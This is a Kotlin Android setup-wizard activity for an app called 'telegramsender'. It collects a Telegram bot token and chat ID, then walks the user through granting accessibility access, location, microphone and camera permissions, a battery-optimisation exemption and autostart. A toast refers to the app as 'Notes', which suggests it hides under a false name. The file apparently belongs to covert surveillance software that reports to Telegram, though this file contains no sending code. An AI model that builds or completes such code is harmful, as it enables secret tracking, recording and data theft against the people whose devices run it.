package com.example.telegramsender.ui

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.telegramsender.MainActivity
import com.example.telegramsender.R
import com.google.android.material.button.MaterialButton
import com.google.android.material.textfield.TextInputEditText

class SetupWizardActivity : AppCompatActivity() {

    private var currentStep = 1
    private lateinit var pref: SharedPreferences

    private lateinit var stepText: TextView
    private lateinit var btnNext: MaterialButton

    private lateinit var stepWelcome: View
    private lateinit var stepTelegram: View
    private lateinit var stepAccessibility: View
    private lateinit var stepPermissions: View
    private lateinit var stepBattery: View
    private lateinit var stepDone: View

    private lateinit var wizardBotToken: TextInputEditText
    private lateinit var wizardChatId: TextInputEditText

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_setup_wizard)
        pref = getSharedPreferences("tg_pref", Context.MODE_PRIVATE)

        stepText = findViewById(R.id.stepText)
        btnNext = findViewById(R.id.btnNext)

        stepWelcome = findViewById(R.id.stepWelcome)
        stepTelegram = findViewById(R.id.stepTelegram)
        stepAccessibility = findViewById(R.id.stepAccessibility)
        stepPermissions = findViewById(R.id.stepPermissions)
        stepBattery = findViewById(R.id.stepBattery)
        stepDone = findViewById(R.id.stepDone)

        wizardBotToken = findViewById(R.id.wizardBotToken)
        wizardChatId = findViewById(R.id.wizardChatId)

        findViewById<MaterialButton>(R.id.btnWizardAccessibility).setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        findViewById<MaterialButton>(R.id.btnWizardPermissions).setOnClickListener {
            requestPermissions(arrayOf(
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.CAMERA
            ), 100)
        }

        findViewById<MaterialButton>(R.id.btnWizardBattery).setOnClickListener {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                    startActivity(intent)
                    Toast.makeText(this, "Find 'Notes' -> 'No Restrictions'", Toast.LENGTH_LONG).show()
                } else {
                    startActivity(Intent(Settings.ACTION_SETTINGS))
                }
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_SETTINGS))
            }
        }

        findViewById<MaterialButton>(R.id.btnWizardAutostart).setOnClickListener {
            // Try to open Xiaomi Autostart if detected, or generic app settings
            try {
                val intent = Intent()
                intent.setClassName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")
                startActivity(intent)
            } catch (e: Exception) {
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
        }

        btnNext.setOnClickListener {
            goToNextStep()
        }

        updateStepVisibility()
    }

    private fun goToNextStep() {
        when (currentStep) {
            1 -> currentStep = 2 // Welcome -> Telegram
            2 -> {
                // Validate Telegram
                val token = wizardBotToken.text.toString().trim()
                val chat = wizardChatId.text.toString().trim()
                if (token.isEmpty() || chat.isEmpty()) {
                    Toast.makeText(this, "Please enter connection details", Toast.LENGTH_SHORT).show()
                    return
                }
                pref.edit().putString("token", token).putString("chatId", chat).apply()
                currentStep = 3
            }
            3 -> currentStep = 4 // Telegram -> Accessibility
            4 -> currentStep = 5 // Accessibility -> Permissions
            5 -> currentStep = 6 // Permissions -> Battery
            6 -> {
                pref.edit().putBoolean("setup_complete", true).apply()
                startActivity(Intent(this, MainActivity::class.java))
                finish()
                return
            }
        }
        updateStepVisibility()
    }

    private fun updateStepVisibility() {
        stepWelcome.visibility = View.GONE
        stepTelegram.visibility = View.GONE
        stepAccessibility.visibility = View.GONE
        stepPermissions.visibility = View.GONE
        stepBattery.visibility = View.GONE
        stepDone.visibility = View.GONE

        when (currentStep) {
            1 -> {
                stepWelcome.visibility = View.VISIBLE
                stepText.text = "Step 1/6"
                btnNext.text = "GET STARTED"
            }
            2 -> {
                stepTelegram.visibility = View.VISIBLE
                stepText.text = "Step 2/6"
                btnNext.text = "CONNECT"
            }
            3 -> {
                stepAccessibility.visibility = View.VISIBLE
                stepText.text = "Step 3/6"
                btnNext.text = "NEXT"
            }
            4 -> {
                stepPermissions.visibility = View.VISIBLE
                stepText.text = "Step 4/6"
                btnNext.text = "NEXT"
            }
            5 -> {
                stepBattery.visibility = View.VISIBLE
                stepText.text = "Step 5/6"
                btnNext.text = "NEXT"
            }
            6 -> {
                stepDone.visibility = View.VISIBLE
                stepText.text = "Complete"
                btnNext.text = "FINISH"
            }
        }
    }
}
